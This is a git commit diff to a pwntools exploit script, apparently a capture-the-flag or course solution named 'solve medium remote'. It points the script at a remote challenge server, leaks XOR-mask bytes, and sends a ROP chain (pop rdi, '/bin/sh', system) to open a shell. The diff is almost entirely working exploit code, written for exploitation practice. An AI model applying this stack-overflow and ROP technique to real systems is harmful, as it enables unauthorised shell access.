d454cb2f47459a3ddc30ce48a70998f7351aeda3
xvisox <hubertmirek@gmail.com>
2024-01-10 12:33:43 +0100

    solve medium remote

--- task/solve.py
+++ task/solve.py
@@ -22,7 +22,7 @@ def bxor(b1, b2):  # use xor for bytes
 
 def send_config(r):
     r.sendline(index_number)
-    r.sendline(b"3")
+    r.sendline(b"2")
 
 
 def send_init(r):
@@ -31,28 +31,29 @@ def send_init(r):
 
 
 def conn():
-    r = process([exe.path, index_number])
-    # r = remote("bsk.bonus.re", 13337)
+    # r = process([exe.path, index_number])
+    r = remote("bsk.bonus.re", 13337)
     if args.GDB:
         gdb.attach(r)
-    # send_config(r)
+    send_config(r)
 
     dl = 96
     send_init(r)
     r.sendline(str(dl + 1).encode())
     r.sendline(b"\0" * dl + b"\n")
-    for _ in range(5):
+    for _ in range(5 + 9):
         __ = r.recvline()
-    recv = r.recvline()  # bytes for xor
+        # print(__.decode())
+    recv = r.recvn(dl + 1)  # bytes for xor
 
-    # for _ in range(0, dl, 8):
-    #     print(hex(u64(recv[_:_+8])))
-
-    send_init(r)
+    for _ in range(0, dl, 8):
+        print(hex(u64(recv[_:_ + 8])))
 
     pop_rdi = 0x402326
     binsh = 0x4a014d
     system = 0x40189b
+
+    send_init(r)
     r.sendline(b"96")
     payload = 72 * b"\0" + bxor(p64(pop_rdi) + p64(binsh) + p64(system), recv[72:96])
     r.sendline(payload)
